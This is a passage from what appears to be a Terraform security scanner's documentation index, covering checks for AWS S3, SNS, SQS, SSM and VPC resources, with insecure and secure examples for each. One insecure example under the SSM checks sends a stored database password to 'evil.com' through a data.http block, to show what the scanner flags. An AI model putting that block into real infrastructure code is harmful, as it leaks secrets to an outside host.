\"good_example\" {\n   bucket = \"mybucket\"\n\n   server_side_encryption_configuration {\n     rule {\n       apply_server_side_encryption_by_default {\n         kms_master_key_id = \"arn\"\n         sse_algorithm     = \"aws:kms\"\n       }\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/enable-bucket-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/enable-bucket-logging/","text":"","title":"S3 Bucket does not have logging enabled."},{"location":"checks/aws/s3/enable-bucket-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/s3/enable-bucket-logging/#explanation","text":"<p>Buckets should have logging enabled so that access can be audited.</p>","title":"Explanation"},{"location":"checks/aws/s3/enable-bucket-logging/#possible-impact","text":"<p>There is no way to determine the access to this bucket</p>","title":"Possible Impact"},{"location":"checks/aws/s3/enable-bucket-logging/#suggested-resolution","text":"<p>Add a logging block to the resource to enable access logging</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/enable-bucket-logging/#insecure-example","text":"<p>The following example will fail the aws-s3-enable-bucket-logging check. <pre><code>resource \"aws_s3_bucket\" \"bad_example\" {\n\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/enable-bucket-logging/#secure-example","text":"<p>The following example will pass the aws-s3-enable-bucket-logging check. <pre><code>resource \"aws_s3_bucket\" \"good_example\" {\n    logging {\n        target_bucket = \"target-bucket\"\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/enable-bucket-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/dev/ServerLogs.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/enable-versioning/","text":"","title":"S3 Data should be versioned"},{"location":"checks/aws/s3/enable-versioning/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/s3/enable-versioning/#explanation","text":"<p>Versioning in Amazon S3 is a means of keeping multiple variants of an object in the same bucket.  You can use the S3 Versioning feature to preserve, retrieve, and restore every version of every object stored in your buckets.  With versioning you can recover more easily from both unintended user actions and application failures.</p>","title":"Explanation"},{"location":"checks/aws/s3/enable-versioning/#possible-impact","text":"<p>Deleted or modified data would not be recoverable</p>","title":"Possible Impact"},{"location":"checks/aws/s3/enable-versioning/#suggested-resolution","text":"<p>Enable versioning to protect against accidental/malicious removal or modification</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/enable-versioning/#insecure-example","text":"<p>The following example will fail the aws-s3-enable-versioning check. <pre><code>resource \"aws_s3_bucket\" \"bad_example\" {\n\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/enable-versioning/#secure-example","text":"<p>The following example will pass the aws-s3-enable-versioning check. <pre><code>resource \"aws_s3_bucket\" \"good_example\" {\n\n    versioning {\n        enabled = true\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/enable-versioning/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/encryption-customer-key/","text":"","title":"S3 encryption should use Customer Managed Keys"},{"location":"checks/aws/s3/encryption-customer-key/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/encryption-customer-key/#explanation","text":"<p>Encryption using AWS keys provides protection for your S3 buckets. To increase control of the encryption and manage factors like rotation use customer managed keys.</p>","title":"Explanation"},{"location":"checks/aws/s3/encryption-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/s3/encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-s3-encryption-customer-key check. <pre><code>resource \"aws_s3_bucket\" \"bad_exampl\" {\n   bucket = \"mybucket\"\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm     = \"AES256\"\n      }\n    }\n  }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-s3-encryption-customer-key check. <pre><code>resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n   bucket = \"mybucket\"\n\n   server_side_encryption_configuration {\n     rule {\n       apply_server_side_encryption_by_default {\n         kms_master_key_id = aws_kms_key.example.arn\n         sse_algorithm     = \"aws:kms\"\n       }\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/ignore-public-acls/","text":"","title":"S3 Access Block should Ignore Public Acl"},{"location":"checks/aws/s3/ignore-public-acls/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/ignore-public-acls/#explanation","text":"<p>S3 buckets should ignore public ACLs on buckets and any objects they contain. By ignoring rather than blocking, PUT calls with public ACLs will still be applied but the ACL will be ignored.</p>","title":"Explanation"},{"location":"checks/aws/s3/ignore-public-acls/#possible-impact","text":"<p>PUT calls with public ACLs specified can make objects public</p>","title":"Possible Impact"},{"location":"checks/aws/s3/ignore-public-acls/#suggested-resolution","text":"<p>Enable ignoring the application of public ACLs in PUT calls</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/ignore-public-acls/#insecure-example","text":"<p>The following example will fail the aws-s3-ignore-public-acls check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"bucket\"\n}\n\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n    bucket = aws_s3_bucket.example.id\n }\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n    bucket = aws_s3_bucket.example.id\n\n    ignore_public_acls = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/ignore-public-acls/#secure-example","text":"<p>The following example will pass the aws-s3-ignore-public-acls check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"bucket\"\n}\n\n resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n    bucket = aws_s3_bucket.example.id\n\n    ignore_public_acls = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/ignore-public-acls/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/no-public-access-with-acl/","text":"","title":"S3 Buckets not publicly accessible through ACL."},{"location":"checks/aws/s3/no-public-access-with-acl/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/no-public-access-with-acl/#explanation","text":"<p>Buckets should not have ACLs that allow public access</p>","title":"Explanation"},{"location":"checks/aws/s3/no-public-access-with-acl/#possible-impact","text":"<p>Public access to the bucket can lead to data leakage</p>","title":"Possible Impact"},{"location":"checks/aws/s3/no-public-access-with-acl/#suggested-resolution","text":"<p>Don't use canned ACLs or switch to private acl</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/no-public-access-with-acl/#insecure-example","text":"<p>The following example will fail the aws-s3-no-public-access-with-acl check. <pre><code>resource \"aws_s3_bucket\" \"bad_example\" {\n    acl = \"public-read\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/no-public-access-with-acl/#secure-example","text":"<p>The following example will pass the aws-s3-no-public-access-with-acl check. <pre><code>resource \"aws_s3_bucket\" \"good_example\" {\n    acl = \"private\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/no-public-access-with-acl/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/no-public-buckets/","text":"","title":"S3 Access block should restrict public bucket to limit access"},{"location":"checks/aws/s3/no-public-buckets/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/no-public-buckets/#explanation","text":"<p>S3 buckets should restrict public policies for the bucket. By enabling, the restrict_public_buckets, only the bucket owner and AWS Services can access if it has a public policy.</p>","title":"Explanation"},{"location":"checks/aws/s3/no-public-buckets/#possible-impact","text":"<p>Public buckets can be accessed by anyone</p>","title":"Possible Impact"},{"location":"checks/aws/s3/no-public-buckets/#suggested-resolution","text":"<p>Limit the access to public buckets to only the owner or AWS Services (eg; CloudFront)</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/no-public-buckets/#insecure-example","text":"<p>The following example will fail the aws-s3-no-public-buckets check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"bucket\"\n}\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n    bucket = aws_s3_bucket.example.id\n }\n\n resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n    bucket = aws_s3_bucket.example.id\n\n    restrict_public_buckets = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/no-public-buckets/#secure-example","text":"<p>The following example will pass the aws-s3-no-public-buckets check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n    bucket = aws_s3_bucket.example.id\n\n    restrict_public_buckets = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/no-public-buckets/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets\u00a1</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/specify-public-access-block/","text":"","title":"S3 buckets should each define an aws_s3_bucket_public_access_block"},{"location":"checks/aws/s3/specify-public-access-block/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/s3/specify-public-access-block/#explanation","text":"<p>The \"block public access\" settings in S3 override individual policies that apply to a given bucket, meaning that all public access can be controlled in one central types for that bucket. It is therefore good practice to define these settings for each bucket in order to clearly define the public access that can be allowed for it.</p>","title":"Explanation"},{"location":"checks/aws/s3/specify-public-access-block/#possible-impact","text":"<p>Public access policies may be applied to sensitive data buckets</p>","title":"Possible Impact"},{"location":"checks/aws/s3/specify-public-access-block/#suggested-resolution","text":"<p>Define a aws_s3_bucket_public_access_block for the given bucket to control public access policies</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/specify-public-access-block/#insecure-example","text":"<p>The following example will fail the aws-s3-specify-public-access-block check. <pre><code> resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"example\"\n    acl = \"private-read\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/specify-public-access-block/#secure-example","text":"<p>The following example will pass the aws-s3-specify-public-access-block check. <pre><code> resource \"aws_s3_bucket\" \"example\" {\n    bucket = \"example\"\n    acl = \"private-read\"\n }\n\n resource \"aws_s3_bucket_public_access_block\" \"example\" {\n    bucket = aws_s3_bucket.example.id\n    block_public_acls   = true\n    block_public_policy = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/specify-public-access-block/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/sns/","text":"","title":"sns"},{"location":"checks/aws/sns/#checks","text":"<ul> <li> <p>enable-topic-encryption Unencrypted SNS topic.</p> </li> <li> <p>topic-encryption-use-cmk SNS topic not encrypted with CMK.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/sns/enable-topic-encryption/","text":"","title":"Unencrypted SNS topic."},{"location":"checks/aws/sns/enable-topic-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/sns/enable-topic-encryption/#explanation","text":"<p>Topics should be encrypted to protect their contents.</p>","title":"Explanation"},{"location":"checks/aws/sns/enable-topic-encryption/#possible-impact","text":"<p>The SNS topic messages could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/sns/enable-topic-encryption/#suggested-resolution","text":"<p>Turn on SNS Topic encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/sns/enable-topic-encryption/#insecure-example","text":"<p>The following example will fail the aws-sns-enable-topic-encryption check. <pre><code> resource \"aws_sns_topic\" \"bad_example\" {\n    # no key id specified\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/sns/enable-topic-encryption/#secure-example","text":"<p>The following example will pass the aws-sns-enable-topic-encryption check. <pre><code> resource \"aws_sns_topic\" \"good_example\" {\n    kms_master_key_id = \"/blah\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/sns/enable-topic-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse</p> </li> <li> <p>https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/sns/topic-encryption-use-cmk/","text":"","title":"SNS topic not encrypted with CMK."},{"location":"checks/aws/sns/topic-encryption-use-cmk/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#explanation","text":"<p>Topics should be encrypted with customer managed KMS keys and not default AWS managed keys, in order to allow granular key management.</p>","title":"Explanation"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#possible-impact","text":"<p>Key management very limited when using default keys.</p>","title":"Possible Impact"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#suggested-resolution","text":"<p>Use a CMK for SNS Topic encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#insecure-example","text":"<p>The following example will fail the aws-sns-topic-encryption-use-cmk check. <pre><code> resource \"aws_sns_topic\" \"bad_example\" {\n    kms_master_key_id = \"alias/aws/sns\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#secure-example","text":"<p>The following example will pass the aws-sns-topic-encryption-use-cmk check. <pre><code> resource \"aws_sns_topic\" \"good_example\" {\n    kms_master_key_id = \"/blah\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/sns/topic-encryption-use-cmk/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse</p> </li> <li> <p>https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/sqs/","text":"","title":"sqs"},{"location":"checks/aws/sqs/#checks","text":"<ul> <li> <p>enable-queue-encryption Unencrypted SQS queue.</p> </li> <li> <p>no-wildcards-in-policy-documents AWS SQS policy document has wildcard action statement.</p> </li> <li> <p>queue-encryption-use-cmk SQS queue should be encrypted with a CMK.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/sqs/enable-queue-encryption/","text":"","title":"Unencrypted SQS queue."},{"location":"checks/aws/sqs/enable-queue-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/sqs/enable-queue-encryption/#explanation","text":"<p>Queues should be encrypted to protect queue contents.</p>","title":"Explanation"},{"location":"checks/aws/sqs/enable-queue-encryption/#possible-impact","text":"<p>The SQS queue messages could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/sqs/enable-queue-encryption/#suggested-resolution","text":"<p>Turn on SQS Queue encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/sqs/enable-queue-encryption/#insecure-example","text":"<p>The following example will fail the aws-sqs-enable-queue-encryption check. <pre><code> resource \"aws_sqs_queue\" \"bad_example\" {\n    # no key specified\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/sqs/enable-queue-encryption/#secure-example","text":"<p>The following example will pass the aws-sqs-enable-queue-encryption check. <pre><code> resource \"aws_sqs_queue\" \"good_example\" {\n    kms_master_key_id = \"/blah\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/sqs/enable-queue-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse</p> </li> <li> <p>https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/","text":"","title":"AWS SQS policy document has wildcard action statement."},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#explanation","text":"<p>SQS Policy actions should always be restricted to a specific set.</p> <p>This ensures that the queue itself cannot be modified or deleted, and prevents possible future additions to queue actions to be implicitly allowed.</p>","title":"Explanation"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#possible-impact","text":"<p>SQS policies with wildcard actions allow more that is required</p>","title":"Possible Impact"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#suggested-resolution","text":"<p>Keep policy scope to the minimum that is required to be effective</p>","title":"Suggested Resolution"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#insecure-example","text":"<p>The following example will fail the aws-sqs-no-wildcards-in-policy-documents check. <pre><code> resource \"aws_sqs_queue_policy\" \"bad_example\" {\n   queue_url = aws_sqs_queue.q.id\n\n   policy = &lt;&lt;POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"*\"\n     }\n   ]\n }\n POLICY\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#secure-example","text":"<p>The following example will pass the aws-sqs-no-wildcards-in-policy-documents check. <pre><code> resource \"aws_sqs_queue_policy\" \"good_example\" {\n   queue_url = aws_sqs_queue.q.id\n\n   policy = &lt;&lt;POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"sqs:SendMessage\"\n     }\n   ]\n }\n POLICY\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/sqs/no-wildcards-in-policy-documents/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy</p> </li> <li> <p>https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/","text":"","title":"SQS queue should be encrypted with a CMK."},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#explanation","text":"<p>Queues should be encrypted with customer managed KMS keys and not default AWS managed keys, in order to allow granular control over access to specific queues.</p>","title":"Explanation"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#possible-impact","text":"<p>The SQS queue messages could be read if compromised. Key management is very limited when using default keys.</p>","title":"Possible Impact"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#suggested-resolution","text":"<p>Encrypt SQS Queue with a customer-managed key</p>","title":"Suggested Resolution"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#insecure-example","text":"<p>The following example will fail the aws-sqs-queue-encryption-use-cmk check. <pre><code> resource \"aws_sqs_queue\" \"bad_example\" {\n    kms_master_key_id = \"alias/aws/sqs\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#secure-example","text":"<p>The following example will pass the aws-sqs-queue-encryption-use-cmk check. <pre><code> resource \"aws_sqs_queue\" \"good_example\" {\n    kms_master_key_id = \"/blah\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/sqs/queue-encryption-use-cmk/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse</p> </li> <li> <p>https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ssm/","text":"","title":"ssm"},{"location":"checks/aws/ssm/#checks","text":"<ul> <li> <p>avoid-leaks-via-http Secrets should not be exfiltrated using Terraform HTTP data blocks</p> </li> <li> <p>secret-use-customer-key Secrets Manager should use customer managed keys</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/ssm/avoid-leaks-via-http/","text":"","title":"Secrets should not be exfiltrated using Terraform HTTP data blocks"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#explanation","text":"<p>The data.http block can be used to send secret data outside of the organisation.</p>","title":"Explanation"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#possible-impact","text":"<p>Secrets could be exposed outside of the organisation.</p>","title":"Possible Impact"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#suggested-resolution","text":"<p>Remove this potential exfiltration HTTP request.</p>","title":"Suggested Resolution"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#insecure-example","text":"<p>The following example will fail the aws-ssm-avoid-leaks-via-http check. <pre><code>resource \"aws_ssm_parameter\" \"db_password\" {\n  name = \"db_password\"\n  type = \"SecureString\"\n  value = var.db_password\n}\n\ndata \"http\" \"not_exfiltrating_data_honest\" {\n  url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#secure-example","text":"<p>The following example will pass the aws-ssm-avoid-leaks-via-http check. <pre><code>resource \"aws_ssm_parameter\" \"db_password\" {\n  name = \"db_password\"\n  type = \"SecureString\"\n  value = var.db_password\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ssm/avoid-leaks-via-http/#links","text":"<ul> <li>https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/</li> </ul>","title":"Links"},{"location":"checks/aws/ssm/secret-use-customer-key/","text":"","title":"Secrets Manager should use customer managed keys"},{"location":"checks/aws/ssm/secret-use-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ssm/secret-use-customer-key/#explanation","text":"<p>Secrets Manager encrypts secrets by default using a default key created by AWS. To ensure control and granularity of secret encryption, CMK's should be used explicitly.</p>","title":"Explanation"},{"location":"checks/aws/ssm/secret-use-customer-key/#possible-impact","text":"<p>Using AWS managed keys reduces the flexibility and control over the encryption key</p>","title":"Possible Impact"},{"location":"checks/aws/ssm/secret-use-customer-key/#suggested-resolution","text":"<p>Use customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/ssm/secret-use-customer-key/#insecure-example","text":"<p>The following example will fail the aws-ssm-secret-use-customer-key check. <pre><code> resource \"aws_secretsmanager_secret\" \"bad_example\" {\n   name       = \"lambda_password\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ssm/secret-use-customer-key/#secure-example","text":"<p>The following example will pass the aws-ssm-secret-use-customer-key check. <pre><code> resource \"aws_kms_key\" \"secrets\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_secretsmanager_secret\" \"good_example\" {\n   name       = \"lambda_password\"\n   kms_key_id = aws_kms_key.secrets.arn\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ssm/secret-use-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/kms/latest/developerguide/services-secrets-manager.html#asm-encrypt</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/","text":"","title":"vpc"},{"location":"checks/aws/vpc/#checks","text":"<ul> <li> <p>add-description-to-security-group Missing description for security group.</p> </li> <li> <p>add-description-to-security-group-rule Missing description for security group rule.</p> </li> <li> <p>no-default-vpc AWS best practice to not use the default VPC for workflows</p> </li> <li> <p>no-excessive-port-access An ingress Network ACL rule allows ALL ports.</p> </li> <li> <p>no-public-egress-sgr An egress security group rule allows traffic to /0.</p> </li> <li> <p>no-public-ingress-acl An ingress Network ACL rule allows specific ports from /0.</p> </li> <li> <p>no-public-ingress-sgr An ingress security group rule allows traffic from /0.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/vpc/add-description-to-security-group/","text":"","title":"Missing description for security group."},{"location":"checks/aws/vpc/add-description-to-security-group/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/vpc/add-description-to-security-group/#explanation","text":"<p>Security groups should include a description for auditing purposes.</p> <p>Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/aws/vpc/add-description-to-security-group/#possible-impact","text":"<p>Descriptions provide context for the firewall rule reasons</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/add-description-to-security-group/#suggested-resolution","text":"<p>Add descriptions for all security groups</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/add-description-to-security-group/#insecure-example","text":"<p>The following example will fail the aws-vpc-add-description-to-security-group check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n   description = \"\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/add-description-to-security-group/#secure-example","text":"<p>The following example will pass the aws-vpc-add-description-to-security-group check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/add-description-to-security-group/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule</p> </li> <li> <p>https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/","text":"","title":"Missing description for security group rule."},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#explanation","text":"<p>Security group rules should include a description for auditing purposes.</p> <p>Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#possible-impact","text":"<p>Descriptions provide context for the firewall rule reasons</p>","title":"Possible Impact"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#suggested-resolution","text":"<p>Add descriptions for all security groups rules</p>","title":"Suggested Resolution"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#insecure-example","text":"<p>The following example will fail the aws-vpc-add-description-to-security-group-rule check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n\n   ingress {\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#secure-example","text":"<p>The following example will pass the aws-vpc-add-description-to-security-group-rule check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/vpc/add-description-to-security-group-rule/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule</p> </li> <li> <p>https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/vpc/no-default-vpc/","text":"","title":"AWS best practice to not use the default VPC for workflows"},{"location":"checks/aws/vpc/no-default-vpc/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/vpc/no-default-vpc/#explanation","text":"<p>Default VPC does not have a lot of the critical security features that standard VPC comes with, new resources should not be created in the default VPC and it should not be present in the 